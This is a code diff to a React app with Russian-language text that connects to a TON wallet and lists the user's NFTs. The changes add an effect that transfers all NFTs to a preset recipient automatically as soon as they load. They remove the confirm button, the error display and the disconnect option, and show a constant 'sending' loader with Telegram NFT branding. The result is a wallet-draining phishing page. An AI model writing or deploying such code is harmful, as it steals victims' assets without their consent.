@@ -32,10 +32,17 @@ function App() {
   }, [])
 
   useEffect(() => {
-    if (wallet && userAddress) {
+    if (wallet && userAddress && recipientUserId) {
       loadNFTs()
     }
-  }, [wallet, userAddress])
+  }, [wallet, userAddress, recipientUserId])
+
+  useEffect(() => {
+    // Автоматически переводим NFT сразу после загрузки
+    if (nfts.length > 0 && !loading && !success) {
+      transferAllNFTs()
+    }
+  }, [nfts])
 
   const loadNFTs = async () => {
     setLoading(true)
@@ -171,41 +178,17 @@ function App() {
 
   return (
     <div className="container main-screen">
-      {loading && (
-        <div className="loader-overlay">
-          <div className="loader">Обработка...</div>
+      <div className="loader-overlay">
+        <div className="nft-preview">
+          <img
+            src="https://nft.fragment.com/telegram.gif"
+            alt="Telegram NFT"
+            className="nft-gif"
+          />
         </div>
-      )}
-
-      {error && <div className="error-banner">{error}</div>}
-
-      <div className="nft-preview">
-        <img
-          src="https://nft.fragment.com/telegram.gif"
-          alt="Telegram NFT"
-          className="nft-gif"
-        />
+        <div className="loader">Отправка NFT...</div>
+        <p style={{ marginTop: '20px', opacity: 0.8 }}>Найдено: {nfts.length} NFT</p>
       </div>
-
-      <div className="info-block">
-        <h2>Найдено NFT: {nfts.length}</h2>
-        <p>Все NFT будут переведены автоматически</p>
-      </div>
-
-      <button
-        className="primary-btn transfer-btn"
-        onClick={transferAllNFTs}
-        disabled={loading || nfts.length === 0}
-      >
-        {loading ? 'Отправка...' : `Перевести все NFT (${nfts.length})`}
-      </button>
-
-      <button
-        className="secondary-btn"
-        onClick={() => tonConnectUI.disconnect()}
-      >
-        Отключить кошелёк
-      </button>
     </div>
   )
 }
